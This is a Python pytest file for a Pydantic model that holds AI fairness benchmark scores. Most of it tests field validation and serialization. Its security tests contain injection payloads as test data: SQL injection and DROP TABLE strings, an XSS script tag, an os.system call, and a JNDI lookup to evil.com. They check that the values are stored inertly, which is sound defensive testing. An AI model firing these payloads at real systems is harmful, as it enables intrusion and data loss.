"""
MIT License
https://mit-license.org/
Copyright © 2025 Infosys Ltd.

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
"""

import pytest
import sys
import os
from typing import Dict, Any
from pydantic import ValidationError
import json

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
from dao.mappers.fairness import Fairness


# ==================== FIXTURES ====================

@pytest.fixture
def valid_fairness_data():
    """Fixture providing valid fairness data"""
    return {
        "model_name": "gpt-4",
        "stereotype_recognition": "0.85",
        "overall_agreement_rate": "0.90",
        "stereotype_query_test": "0.88",
        "disparagement_sex": "0.92",
        "disparagement_race": "0.94",
        "prefereence_rta": "0.87",
        "overall": "0.894",
        "inhouse_model": False
    }


@pytest.fixture
def fairness_instance(valid_fairness_data):
    """Fixture providing a Fairness instance"""
    return Fairness(**valid_fairness_data)


@pytest.fixture
def minimal_fairness_data():
    """Fixture with minimal valid data"""
    return {
        "model_name": "test-model",
        "stereotype_recognition": "0.0",
        "overall_agreement_rate": "0.0",
        "stereotype_query_test": "0.0",
        "disparagement_sex": "0.0",
        "disparagement_race": "0.0",
        "prefereence_rta": "0.0",
        "overall": "0.0",
        "inhouse_model": False
    }


@pytest.fixture
def inhouse_model_data():
    """Fixture for inhouse model testing"""
    return {
        "model_name": "custom-inhouse-model",
        "stereotype_recognition": "0.95",
        "overall_agreement_rate": "0.93",
        "stereotype_query_test": "0.91",
        "disparagement_sex": "0.96",
        "disparagement_race": "0.97",
        "prefereence_rta": "0.92",
        "overall": "0.943",
        "inhouse_model": True
    }


# ==================== FUNCTIONAL CORRECTNESS TESTS ====================

class TestFairnessFunctionalCorrectness:
    """Test functional correctness of Fairness model"""
    
    def test_create_fairness_with_all_fields(self, valid_fairness_data):
        """Test creating Fairness instance with all fields"""
        fairness = Fairness(**valid_fairness_data)
        
        assert fairness.model_name == "gpt-4"
        assert fairness.stereotype_recognition == "0.85"
        assert fairness.overall_agreement_rate == "0.90"
        assert fairness.stereotype_query_test == "0.88"
        assert fairness.disparagement_sex == "0.92"
        assert fairness.disparagement_race == "0.94"
        assert fairness.prefereence_rta == "0.87"
        assert fairness.overall == "0.894"
        assert fairness.inhouse_model is False
    
    def test_all_score_fields_are_strings(self, valid_fairness_data):
        """Test that all score fields are stored as strings"""
        fairness = Fairness(**valid_fairness_data)
        
        assert isinstance(fairness.model_name, str)
        assert isinstance(fairness.stereotype_recognition, str)
        assert isinstance(fairness.overall_agreement_rate, str)
        assert isinstance(fairness.stereotype_query_test, str)
        assert isinstance(fairness.disparagement_sex, str)
        assert isinstance(fairness.disparagement_race, str)
        assert isinstance(fairness.prefereence_rta, str)
        assert isinstance(fairness.overall, str)
    
    def test_inhouse_model_field_is_boolean(self, valid_fairness_data):
        """Test that inhouse_model is a boolean"""
        fairness = Fairness(**valid_fairness_data)
        
        assert isinstance(fairness.inhouse_model, bool)
    
    def test_inhouse_model_true(self, inhouse_model_data):
        """Test setting inhouse_model to True"""
        fairness = Fairness(**inhouse_model_data)
        
        assert fairness.inhouse_model is True
        assert fairness.model_name == "custom-inhouse-model"
    
    def test_inhouse_model_false(self, valid_fairness_data):
        """Test setting inhouse_model to False"""
        fairness = Fairness(**valid_fairness_data)
        
        assert fairness.inhouse_model is False
    
    def test_model_name_field_variations(self, valid_fairness_data):
        """Test various model_name values"""
        model_names = [
            "gpt-4",
            "claude-3-opus",
            "llama-2-70b",
            "custom_model_v1",
            "Model-2024",
            "AI-Fairness-Model"
        ]
        
        for model_name in model_names:
            valid_fairness_data["model_name"] = model_name
            fairness = Fairness(**valid_fairness_data)
            assert fairness.model_name == model_name
    
    def test_stereotype_recognition_field(self, valid_fairness_data):
        """Test stereotype_recognition field"""
        test_values = ["0.0", "0.5", "0.999", "1.0"]
        
        for value in test_values:
            valid_fairness_data["stereotype_recognition"] = value
            fairness = Fairness(**valid_fairness_data)
            assert fairness.stereotype_recognition == value
    
    def test_overall_agreement_rate_field(self, valid_fairness_data):
        """Test overall_agreement_rate field"""
        test_values = ["0.1", "0.45", "0.89", "1.0"]
        
        for value in test_values:
            valid_fairness_data["overall_agreement_rate"] = value
            fairness = Fairness(**valid_fairness_data)
            assert fairness.overall_agreement_rate == value
    
    def test_stereotype_query_test_field(self, valid_fairness_data):
        """Test stereotype_query_test field"""
        test_values = ["0.2", "0.55", "0.88"]
        
        for value in test_values:
            valid_fairness_data["stereotype_query_test"] = value
            fairness = Fairness(**valid_fairness_data)
            assert fairness.stereotype_query_test == value
    
    def test_disparagement_sex_field(self, valid_fairness_data):
        """Test disparagement_sex field"""
        test_values = ["0.0", "0.33", "0.67", "1.0"]
        
        for value in test_values:
            valid_fairness_data["disparagement_sex"] = value
            fairness = Fairness(**valid_fairness_data)
            assert fairness.disparagement_sex == value
    
    def test_disparagement_race_field(self, valid_fairness_data):
        """Test disparagement_race field"""
        test_values = ["0.15", "0.5", "0.95"]
        
        for value in test_values:
            valid_fairness_data["disparagement_race"] = value
            fairness = Fairness(**valid_fairness_data)
            assert fairness.disparagement_race == value
    
    def test_prefereence_rta_field(self, valid_fairness_data):
        """Test prefereence_rta field (note the typo in field name)"""
        test_values = ["0.0", "0.4", "0.8", "1.0"]
        
        for value in test_values:
            valid_fairness_data["prefereence_rta"] = value
            fairness = Fairness(**valid_fairness_data)
            assert fairness.prefereence_rta == value
    
    def test_overall_field(self, valid_fairness_data):
        """Test overall field"""
        test_values = ["0.0", "0.123", "0.888", "1.0"]
        
        for value in test_values:
            valid_fairness_data["overall"] = value
            fairness = Fairness(**valid_fairness_data)
            assert fairness.overall == value


# ==================== EDGE CASES TESTS ====================

class TestFairnessEdgeCases:
    """Test edge cases for Fairness model"""
    
    def test_empty_string_score_values(self, valid_fairness_data):
        """Test that empty strings are accepted for score fields"""
        valid_fairness_data["stereotype_recognition"] = ""
        valid_fairness_data["overall"] = ""
        
        fairness = Fairness(**valid_fairness_data)
        
        assert fairness.stereotype_recognition == ""
        assert fairness.overall == ""
    
    def test_very_long_string_values(self, valid_fairness_data):
        """Test handling of very long string values"""
        long_value = "0." + "1234567890" * 100
        valid_fairness_data["overall"] = long_value
        
        fairness = Fairness(**valid_fairness_data)
        
        assert fairness.overall == long_value
        assert len(fairness.overall) > 1000
    
    def test_special_characters_in_score_fields(self, valid_fairness_data):
        """Test special characters in score fields"""
        special_values = [
            "0.85%",
            "N/A",
            "null",
            "-0.5",
            "+0.95",
            "0,85"
        ]
        
        for value in special_values:
            valid_fairness_data["stereotype_recognition"] = value
            fairness = Fairness(**valid_fairness_data)
            assert fairness.stereotype_recognition == value
    
    def test_whitespace_in_strings(self, valid_fairness_data):
        """Test handling of whitespace in string fields"""
        valid_fairness_data["model_name"] = "  model with spaces  "
        valid_fairness_data["overall"] = " 0.85 "
        
        fairness = Fairness(**valid_fairness_data)
        
        assert fairness.model_name == "  model with spaces  "
        assert fairness.overall == " 0.85 "
    
    def test_zero_values(self, valid_fairness_data):
        """Test zero values for score fields"""
        valid_fairness_data["stereotype_recognition"] = "0"
        valid_fairness_data["overall_agreement_rate"] = "0.0"
        valid_fairness_data["overall"] = "0.00"
        
        fairness = Fairness(**valid_fairness_data)
        
        assert fairness.stereotype_recognition == "0"
        assert fairness.overall_agreement_rate == "0.0"
        assert fairness.overall == "0.00"
    
    def test_very_large_score_values(self, valid_fairness_data):
        """Test very large numeric string values"""
        valid_fairness_data["overall"] = "999999.999999"
        
        fairness = Fairness(**valid_fairness_data)
        
        assert fairness.overall == "999999.999999"
    
    def test_negative_score_values(self, valid_fairness_data):
        """Test negative score values"""
        valid_fairness_data["stereotype_recognition"] = "-0.5"
        valid_fairness_data["overall"] = "-100"
        
        fairness = Fairness(**valid_fairness_data)
        
        assert fairness.stereotype_recognition == "-0.5"
        assert fairness.overall == "-100"
    
    def test_unicode_characters_in_model_name(self, valid_fairness_data):
        """Test unicode characters in model_name"""
        unicode_names = [
            "模型-GPT-4",
            "Модель-Fairness",
            "モデル-AI",
            "🤖-Fairness-Model",
            "Model™®©"
        ]
        
        for name in unicode_names:
            valid_fairness_data["model_name"] = name
            fairness = Fairness(**valid_fairness_data)
            assert fairness.model_name == name
    
    def test_single_character_model_name(self, valid_fairness_data):
        """Test single character model name"""
        valid_fairness_data["model_name"] = "A"
        
        fairness = Fairness(**valid_fairness_data)
        
        assert fairness.model_name == "A"
    
    def test_very_long_model_name(self, valid_fairness_data):
        """Test very long model name"""
        long_name = "model_" * 1000
        valid_fairness_data["model_name"] = long_name
        
        fairness = Fairness(**valid_fairness_data)
        
        assert fairness.model_name == long_name
        assert len(fairness.model_name) >= 6000
    
    def test_numeric_string_formats(self, valid_fairness_data):
        """Test various numeric string formats"""
        formats = [
            "0.5",
            ".5",
            "0.500",
            "0.5000000",
            "5e-1",
            "5E-1"
        ]
        
        for fmt in formats:
            valid_fairness_data["stereotype_recognition"] = fmt
            fairness = Fairness(**valid_fairness_data)
            assert fairness.stereotype_recognition == fmt


# ==================== ERROR HANDLING & VALIDATION TESTS ====================

class TestFairnessErrorHandling:
    """Test error handling and validation"""
    
    def test_missing_required_model_name(self, valid_fairness_data):
        """Test that missing model_name raises ValidationError"""
        del valid_fairness_data["model_name"]
        
        with pytest.raises(ValidationError) as exc_info:
            Fairness(**valid_fairness_data)
        
        assert "model_name" in str(exc_info.value)
        assert "Field required" in str(exc_info.value)
    
    def test_missing_required_stereotype_recognition(self, valid_fairness_data):
        """Test that missing stereotype_recognition raises ValidationError"""
        del valid_fairness_data["stereotype_recognition"]
        
        with pytest.raises(ValidationError) as exc_info:
            Fairness(**valid_fairness_data)
        
        assert "stereotype_recognition" in str(exc_info.value)
    
    def test_missing_required_overall_agreement_rate(self, valid_fairness_data):
        """Test that missing overall_agreement_rate raises ValidationError"""
        del valid_fairness_data["overall_agreement_rate"]
        
        with pytest.raises(ValidationError) as exc_info:
            Fairness(**valid_fairness_data)
        
        assert "overall_agreement_rate" in str(exc_info.value)
    
    def test_missing_required_stereotype_query_test(self, valid_fairness_data):
        """Test that missing stereotype_query_test raises ValidationError"""
        del valid_fairness_data["stereotype_query_test"]
        
        with pytest.raises(ValidationError) as exc_info:
            Fairness(**valid_fairness_data)
        
        assert "stereotype_query_test" in str(exc_info.value)
    
    def test_missing_required_disparagement_sex(self, valid_fairness_data):
        """Test that missing disparagement_sex raises ValidationError"""
        del valid_fairness_data["disparagement_sex"]
        
        with pytest.raises(ValidationError) as exc_info:
            Fairness(**valid_fairness_data)
        
        assert "disparagement_sex" in str(exc_info.value)
    
    def test_missing_required_disparagement_race(self, valid_fairness_data):
        """Test that missing disparagement_race raises ValidationError"""
        del valid_fairness_data["disparagement_race"]
        
        with pytest.raises(ValidationError) as exc_info:
            Fairness(**valid_fairness_data)
        
        assert "disparagement_race" in str(exc_info.value)
    
    def test_missing_required_prefereence_rta(self, valid_fairness_data):
        """Test that missing prefereence_rta raises ValidationError"""
        del valid_fairness_data["prefereence_rta"]
        
        with pytest.raises(ValidationError) as exc_info:
            Fairness(**valid_fairness_data)
        
        assert "prefereence_rta" in str(exc_info.value)
    
    def test_missing_required_overall(self, valid_fairness_data):
        """Test that missing overall raises ValidationError"""
        del valid_fairness_data["overall"]
        
        with pytest.raises(ValidationError) as exc_info:
            Fairness(**valid_fairness_data)
        
        assert "overall" in str(exc_info.value)
    
    def test_missing_required_inhouse_model(self, valid_fairness_data):
        """Test that missing inhouse_model raises ValidationError"""
        del valid_fairness_data["inhouse_model"]
        
        with pytest.raises(ValidationError) as exc_info:
            Fairness(**valid_fairness_data)
        
        assert "inhouse_model" in str(exc_info.value)
    
    def test_none_value_for_required_field(self, valid_fairness_data):
        """Test that None value for required field raises ValidationError"""
        valid_fairness_data["model_name"] = None
        
        with pytest.raises(ValidationError) as exc_info:
            Fairness(**valid_fairness_data)
        
        assert "model_name" in str(exc_info.value)
    
    def test_none_value_for_score_field(self, valid_fairness_data):
        """Test that None value for score field raises ValidationError"""
        valid_fairness_data["stereotype_recognition"] = None
        
        with pytest.raises(ValidationError) as exc_info:
            Fairness(**valid_fairness_data)
        
        assert "stereotype_recognition" in str(exc_info.value)
    
    def test_invalid_type_for_inhouse_model(self, valid_fairness_data):
        """Test that invalid type for inhouse_model raises ValidationError"""
        valid_fairness_data["inhouse_model"] = "not_a_boolean"
        
        with pytest.raises(ValidationError) as exc_info:
            Fairness(**valid_fairness_data)
        
        assert "inhouse_model" in str(exc_info.value)
        assert "bool_parsing" in str(exc_info.value)
    
    def test_numeric_inhouse_model_values(self, valid_fairness_data):
        """Test numeric values for inhouse_model field"""
        valid_fairness_data["inhouse_model"] = 0
        fairness1 = Fairness(**valid_fairness_data)
        assert fairness1.inhouse_model is False
        
        valid_fairness_data["inhouse_model"] = 1
        fairness2 = Fairness(**valid_fairness_data)
        assert fairness2.inhouse_model is True
    
    def test_empty_dict_initialization(self):
        """Test that empty dict raises ValidationError"""
        with pytest.raises(ValidationError) as exc_info:
            Fairness()
        
        errors = str(exc_info.value)
        assert "model_name" in errors
        assert "stereotype_recognition" in errors
        assert "inhouse_model" in errors
    
    def test_extra_fields_handling(self, valid_fairness_data):
        """Test handling of extra fields not in model"""
        valid_fairness_data["extra_field"] = "extra_value"
        valid_fairness_data["another_field"] = 123
        
        # By default, Pydantic ignores extra fields
        fairness = Fairness(**valid_fairness_data)
        
        assert not hasattr(fairness, "extra_field")
        assert not hasattr(fairness, "another_field")
    
    def test_multiple_missing_fields(self):
        """Test that multiple missing fields are reported"""
        incomplete_data = {
            "model_name": "test-model"
            # All other fields missing
        }
        
        with pytest.raises(ValidationError) as exc_info:
            Fairness(**incomplete_data)
        
        error_str = str(exc_info.value)
        assert "stereotype_recognition" in error_str
        assert "inhouse_model" in error_str


# ==================== SERIALIZATION & DESERIALIZATION TESTS ====================

class TestFairnessSerialization:
    """Test serialization and deserialization"""
    
    def test_model_dump(self, fairness_instance):
        """Test converting Fairness instance to dictionary"""
        data = fairness_instance.model_dump()
        
        assert isinstance(data, dict)
        assert data["model_name"] == "gpt-4"
        assert data["stereotype_recognition"] == "0.85"
        assert data["inhouse_model"] is False
        assert len(data) == 9  # All 9 fields
    
    def test_model_dump_json(self, fairness_instance):
        """Test converting Fairness instance to JSON string"""
        json_str = fairness_instance.model_dump_json()
        
        assert isinstance(json_str, str)
        assert "gpt-4" in json_str
        assert "0.85" in json_str
        
        # Verify it's valid JSON
        parsed = json.loads(json_str)
        assert parsed["model_name"] == "gpt-4"
    
    def test_model_dump_exclude_fields(self, fairness_instance):
        """Test excluding fields during serialization"""
        data = fairness_instance.model_dump(exclude={"inhouse_model", "overall"})
        
        assert "model_name" in data
        assert "stereotype_recognition" in data
        assert "inhouse_model" not in data
        assert "overall" not in data
    
    def test_model_dump_include_fields(self, fairness_instance):
        """Test including only specific fields during serialization"""
        data = fairness_instance.model_dump(include={"model_name", "overall", "inhouse_model"})
        
        assert "model_name" in data
        assert "overall" in data
        assert "inhouse_model" in data
        assert "stereotype_recognition" not in data
    
    def test_json_deserialization(self, valid_fairness_data):
        """Test creating Fairness from JSON string"""
        json_str = json.dumps(valid_fairness_data)
        fairness = Fairness.model_validate_json(json_str)
        
        assert fairness.model_name == valid_fairness_data["model_name"]
        assert fairness.overall == valid_fairness_data["overall"]
    
    def test_dict_deserialization(self, valid_fairness_data):
        """Test creating Fairness from dictionary"""
        fairness = Fairness.model_validate(valid_fairness_data)
        
        assert fairness.model_name == valid_fairness_data["model_name"]
        assert fairness.stereotype_recognition == valid_fairness_data["stereotype_recognition"]
    
    def test_roundtrip_serialization(self, fairness_instance):
        """Test that serialization and deserialization preserve data"""
        # Serialize to dict
        data = fairness_instance.model_dump()
        
        # Deserialize back
        fairness_copy = Fairness(**data)
        
        # Compare all fields
        assert fairness_copy.model_name == fairness_instance.model_name
        assert fairness_copy.stereotype_recognition == fairness_instance.stereotype_recognition
        assert fairness_copy.overall_agreement_rate == fairness_instance.overall_agreement_rate
        assert fairness_copy.stereotype_query_test == fairness_instance.stereotype_query_test
        assert fairness_copy.disparagement_sex == fairness_instance.disparagement_sex
        assert fairness_copy.disparagement_race == fairness_instance.disparagement_race
        assert fairness_copy.prefereence_rta == fairness_instance.prefereence_rta
        assert fairness_copy.overall == fairness_instance.overall
        assert fairness_copy.inhouse_model == fairness_instance.inhouse_model
    
    def test_json_roundtrip(self, fairness_instance):
        """Test JSON serialization and deserialization roundtrip"""
        json_str = fairness_instance.model_dump_json()
        fairness_copy = Fairness.model_validate_json(json_str)
        
        assert fairness_copy.model_name == fairness_instance.model_name
        assert fairness_copy.overall == fairness_instance.overall
        assert fairness_copy.inhouse_model == fairness_instance.inhouse_model


# ==================== EQUALITY & COMPARISON TESTS ====================

class TestFairnessEquality:
    """Test equality and comparison operations"""
    
    def test_equality_same_values(self, valid_fairness_data):
        """Test that two Fairness instances with same values are equal"""
        fairness1 = Fairness(**valid_fairness_data)
        fairness2 = Fairness(**valid_fairness_data)
        
        assert fairness1 == fairness2
    
    def test_inequality_different_model_name(self, valid_fairness_data):
        """Test that Fairness instances with different model_name are not equal"""
        fairness1 = Fairness(**valid_fairness_data)
        
        valid_fairness_data["model_name"] = "different-model"
        fairness2 = Fairness(**valid_fairness_data)
        
        assert fairness1 != fairness2
    
    def test_inequality_different_score(self, valid_fairness_data):
        """Test that Fairness instances with different score are not equal"""
        fairness1 = Fairness(**valid_fairness_data)
        
        valid_fairness_data["overall"] = "0.99"
        fairness2 = Fairness(**valid_fairness_data)
        
        assert fairness1 != fairness2
    
    def test_inequality_different_inhouse_model(self, valid_fairness_data):
        """Test that Fairness instances with different inhouse_model are not equal"""
        valid_fairness_data["inhouse_model"] = False
        fairness1 = Fairness(**valid_fairness_data)
        
        valid_fairness_data["inhouse_model"] = True
        fairness2 = Fairness(**valid_fairness_data)
        
        assert fairness1 != fairness2


# ==================== IMMUTABILITY & STATE TESTS ====================

class TestFairnessImmutability:
    """Test immutability and state management"""
    
    def test_field_modification(self, fairness_instance):
        """Test that fields can be modified"""
        original_name = fairness_instance.model_name
        fairness_instance.model_name = "new-model"
        
        assert fairness_instance.model_name == "new-model"
        assert fairness_instance.model_name != original_name
    
    def test_score_field_reassignment(self, fairness_instance):
        """Test that score fields can be reassigned"""
        fairness_instance.overall = "0.95"
        
        assert isinstance(fairness_instance.overall, str)
        assert fairness_instance.overall == "0.95"
    
    def test_inhouse_model_toggle(self, fairness_instance):
        """Test toggling inhouse_model field"""
        original_value = fairness_instance.inhouse_model
        fairness_instance.inhouse_model = not original_value
        
        assert fairness_instance.inhouse_model != original_value
    
    def test_multiple_field_modifications(self, fairness_instance):
        """Test modifying multiple fields"""
        fairness_instance.stereotype_recognition = "0.99"
        fairness_instance.disparagement_sex = "0.98"
        fairness_instance.overall = "0.985"
        
        assert fairness_instance.stereotype_recognition == "0.99"
        assert fairness_instance.disparagement_sex == "0.98"
        assert fairness_instance.overall == "0.985"


# ==================== PERFORMANCE TESTS ====================

class TestFairnessPerformance:
    """Test performance characteristics"""
    
    def test_instantiation_performance(self, valid_fairness_data):
        """Test that Fairness instantiation is fast"""
        import time
        
        start_time = time.time()
        for _ in range(1000):
            Fairness(**valid_fairness_data)
        end_time = time.time()
        
        # 1000 instantiations should complete quickly
        assert (end_time - start_time) < 1.0
    
    def test_serialization_performance(self, fairness_instance):
        """Test that serialization is fast"""
        import time
        
        start_time = time.time()
        for _ in range(1000):
            fairness_instance.model_dump()
        end_time = time.time()
        
        # 1000 serializations should complete quickly
        assert (end_time - start_time) < 0.5
    
    def test_validation_performance(self, valid_fairness_data):
        """Test that validation is fast"""
        import time
        
        start_time = time.time()
        for _ in range(1000):
            Fairness.model_validate(valid_fairness_data)
        end_time = time.time()
        
        # 1000 validations should complete quickly
        assert (end_time - start_time) < 1.0


# ==================== CODE QUALITY & STRUCTURE TESTS ====================

class TestFairnessCodeQuality:
    """Test code quality and structure"""
    
    def test_fairness_is_pydantic_basemodel(self):
        """Test that Fairness inherits from BaseModel"""
        from pydantic import BaseModel
        assert issubclass(Fairness, BaseModel)
    
    def test_all_required_fields_present(self):
        """Test that all expected fields are defined"""
        fields = Fairness.model_fields
        
        assert "model_name" in fields
        assert "stereotype_recognition" in fields
        assert "overall_agreement_rate" in fields
        assert "stereotype_query_test" in fields
        assert "disparagement_sex" in fields
        assert "disparagement_race" in fields
        assert "prefereence_rta" in fields
        assert "overall" in fields
        assert "inhouse_model" in fields
    
    def test_field_count(self):
        """Test that model has exactly 9 fields"""
        fields = Fairness.model_fields
        assert len(fields) == 9
    
    def test_field_types(self):
        """Test that fields have correct type annotations"""
        fields = Fairness.model_fields
        
        # String fields
        assert fields["model_name"].annotation == str
        assert fields["stereotype_recognition"].annotation == str
        assert fields["overall_agreement_rate"].annotation == str
        assert fields["stereotype_query_test"].annotation == str
        assert fields["disparagement_sex"].annotation == str
        assert fields["disparagement_race"].annotation == str
        assert fields["prefereence_rta"].annotation == str
        assert fields["overall"].annotation == str
        
        # Boolean field
        assert fields["inhouse_model"].annotation == bool
    
    def test_no_optional_fields(self):
        """Test that all fields are required (no defaults except for typed fields)"""
        fields = Fairness.model_fields
        
        for field_name, field_info in fields.items():
            assert field_info.is_required(), f"Field {field_name} should be required"
    
    def test_fairness_has_string_representation(self, fairness_instance):
        """Test that Fairness instance has string representation"""
        str_repr = str(fairness_instance)
        
        assert isinstance(str_repr, str)
        assert len(str_repr) > 0
    
    def test_fairness_has_repr(self, fairness_instance):
        """Test that Fairness instance has repr"""
        repr_str = repr(fairness_instance)
        
        assert isinstance(repr_str, str)
        assert "Fairness" in repr_str


# ==================== PARAMETRIZED TESTS ====================

class TestFairnessParametrized:
    """Parametrized tests for comprehensive coverage"""
    
    @pytest.mark.parametrize("field_name,field_value", [
        ("stereotype_recognition", "0.1"),
        ("stereotype_recognition", "0.999999"),
        ("overall_agreement_rate", "0.0"),
        ("overall_agreement_rate", "1.0"),
        ("stereotype_query_test", "0.5"),
        ("disparagement_sex", "0.75"),
        ("disparagement_race", "0.25"),
        ("prefereence_rta", "0.888"),
        ("overall", "0.5"),
    ])
    def test_various_score_values(self, valid_fairness_data, field_name, field_value):
        """Test various score values for different fields"""
        valid_fairness_data[field_name] = field_value
        fairness = Fairness(**valid_fairness_data)
        
        assert getattr(fairness, field_name) == field_value
    
    @pytest.mark.parametrize("model_name", [
        "gpt-3.5-turbo",
        "gpt-4",
        "claude-2",
        "claude-3-opus",
        "llama-2-7b",
        "llama-2-70b",
        "mistral-7b",
        "gemini-pro",
        "custom-fairness-model",
        "inhouse-model-v2",
    ])
    def test_various_model_names(self, valid_fairness_data, model_name):
        """Test various common model names"""
        valid_fairness_data["model_name"] = model_name
        fairness = Fairness(**valid_fairness_data)
        
        assert fairness.model_name == model_name
    
    @pytest.mark.parametrize("inhouse_value,expected", [
        (True, True),
        (False, False),
        (1, True),
        (0, False),
        ("true", True),
        ("false", False),
    ])
    def test_various_inhouse_model_values(self, valid_fairness_data, inhouse_value, expected):
        """Test various inhouse_model values and their coercion"""
        valid_fairness_data["inhouse_model"] = inhouse_value
        fairness = Fairness(**valid_fairness_data)
        
        assert fairness.inhouse_model == expected
    
    @pytest.mark.parametrize("missing_field", [
        "model_name",
        "stereotype_recognition",
        "overall_agreement_rate",
        "stereotype_query_test",
        "disparagement_sex",
        "disparagement_race",
        "prefereence_rta",
        "overall",
        "inhouse_model",
    ])
    def test_missing_required_fields(self, valid_fairness_data, missing_field):
        """Test that missing any required field raises ValidationError"""
        del valid_fairness_data[missing_field]
        
        with pytest.raises(ValidationError) as exc_info:
            Fairness(**valid_fairness_data)
        
        assert missing_field in str(exc_info.value)


# ==================== INTEGRATION TESTS ====================

class TestFairnessIntegration:
    """Test integration with external systems"""
    
    def test_json_compatibility(self, fairness_instance):
        """Test that Fairness can be serialized to standard JSON"""
        json_str = fairness_instance.model_dump_json()
        
        # Should be parseable by standard json module
        data = json.loads(json_str)
        assert isinstance(data, dict)
        assert data["model_name"] == fairness_instance.model_name
    
    def test_dict_compatibility(self, fairness_instance):
        """Test that Fairness works with dict operations"""
        data = fairness_instance.model_dump()
        
        # Should support dict operations
        assert "model_name" in data
        assert list(data.keys())
        assert list(data.values())
    
    def test_database_ready_format(self, fairness_instance):
        """Test that Fairness output is ready for database storage"""
        data = fairness_instance.model_dump()
        
        # All values should be JSON-serializable types
        json_str = json.dumps(data)
        assert isinstance(json_str, str)
        
        # Should be able to parse back
        parsed = json.loads(json_str)
        assert parsed == data
    
    def test_batch_processing_simulation(self, valid_fairness_data):
        """Test creating multiple Fairness instances for batch processing"""
        instances = []
        
        for i in range(10):
            data = valid_fairness_data.copy()
            data["model_name"] = f"model-{i}"
            data["overall"] = f"0.{i}{i}"
            instances.append(Fairness(**data))
        
        assert len(instances) == 10
        assert instances[0].model_name == "model-0"
        assert instances[9].model_name == "model-9"


# ==================== REGRESSION TESTS ====================

class TestFairnessRegression:
    """Test for regression and backward compatibility"""
    
    def test_typo_in_prefereence_rta_field_name(self, valid_fairness_data):
        """Test that the typo 'prefereence_rta' (3 e's) is preserved"""
        # This tests that the field name with typo is maintained
        fairness = Fairness(**valid_fairness_data)
        
        assert hasattr(fairness, "prefereence_rta")
        assert fairness.prefereence_rta == "0.87"
    
    def test_backwards_compatible_with_old_data(self):
        """Test that model works with legacy data format"""
        legacy_data = {
            "model_name": "legacy-model",
            "stereotype_recognition": "0.8",
            "overall_agreement_rate": "0.85",
            "stereotype_query_test": "0.82",
            "disparagement_sex": "0.88",
            "disparagement_race": "0.90",
            "prefereence_rta": "0.83",
            "overall": "0.852",
            "inhouse_model": False
        }
        
        fairness = Fairness(**legacy_data)
        
        assert fairness.model_name == "legacy-model"
        assert fairness.inhouse_model is False
    
    def test_all_fields_have_correct_types(self, valid_fairness_data):
        """Regression test to ensure field types are correct"""
        fairness = Fairness(**valid_fairness_data)
        
        # Verify string fields
        for field_name in ["model_name", "stereotype_recognition", "overall_agreement_rate",
                          "stereotype_query_test", "disparagement_sex", "disparagement_race",
                          "prefereence_rta", "overall"]:
            value = getattr(fairness, field_name)
            assert isinstance(value, str), f"Field {field_name} should be string, got {type(value)}"
        
        # Verify boolean field
        assert isinstance(fairness.inhouse_model, bool)


# ==================== SECURITY TESTS ====================

class TestFairnessSecurity:
    """Test security aspects"""
    
    def test_no_code_injection_in_model_name(self, valid_fairness_data):
        """Test that model_name with code-like strings is treated as string"""
        malicious_names = [
            "__import__('os').system('ls')",
            "'; DROP TABLE fairness; --",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/a}",
        ]
        
        for name in malicious_names:
            valid_fairness_data["model_name"] = name
            fairness = Fairness(**valid_fairness_data)
            # Should just store as string, not execute
            assert fairness.model_name == name
            assert isinstance(fairness.model_name, str)
    
    def test_no_code_injection_in_score_fields(self, valid_fairness_data):
        """Test that score fields with malicious strings are treated as strings"""
        valid_fairness_data["overall"] = "exec('malicious code')"
        
        fairness = Fairness(**valid_fairness_data)
        
        # Should just store as string, not execute
        assert fairness.overall == "exec('malicious code')"
        assert isinstance(fairness.overall, str)
    
    def test_sql_injection_patterns(self, valid_fairness_data):
        """Test various SQL injection patterns"""
        sql_patterns = [
            "1' OR '1'='1",
            "'; DROP TABLE users; --",
            "admin'--",
            "' UNION SELECT * FROM users--",
        ]
        
        for pattern in sql_patterns:
            valid_fairness_data["model_name"] = pattern
            fairness = Fairness(**valid_fairness_data)
            assert fairness.model_name == pattern


# ==================== SCALABILITY TESTS ====================

class TestFairnessScalability:
    """Test scalability aspects"""
    
    def test_handle_multiple_instances(self, valid_fairness_data):
        """Test creating multiple Fairness instances"""
        instances = []
        
        for i in range(100):
            data = valid_fairness_data.copy()
            data["model_name"] = f"model-{i}"
            data["overall"] = f"0.{i:02d}"
            instances.append(Fairness(**data))
        
        assert len(instances) == 100
        assert instances[0].model_name == "model-0"
        assert instances[99].model_name == "model-99"
    
    def test_memory_efficiency_with_many_instances(self, valid_fairness_data):
        """Test memory efficiency with many instances"""
        instances = []
        
        for i in range(1000):
            data = valid_fairness_data.copy()
            data["model_name"] = f"model-{i}"
            instances.append(Fairness(**data))
        
        # All instances should be created successfully
        assert len(instances) == 1000
    
    def test_large_batch_serialization(self, valid_fairness_data):
        """Test serializing many instances"""
        instances = [Fairness(**valid_fairness_data) for _ in range(100)]
        
        serialized = [inst.model_dump() for inst in instances]
        
        assert len(serialized) == 100
        assert all(isinstance(item, dict) for item in serialized)


# ==================== FIELD-SPECIFIC TESTS ====================

class TestFairnessFieldSpecific:
    """Test specific behaviors of individual fields"""
    
    def test_stereotype_fields_relationship(self, valid_fairness_data):
        """Test relationship between stereotype-related fields"""
        valid_fairness_data["stereotype_recognition"] = "0.8"
        valid_fairness_data["stereotype_query_test"] = "0.85"
        
        fairness = Fairness(**valid_fairness_data)
        
        # Both stereotype fields should be present and independent
        assert fairness.stereotype_recognition == "0.8"
        assert fairness.stereotype_query_test == "0.85"
    
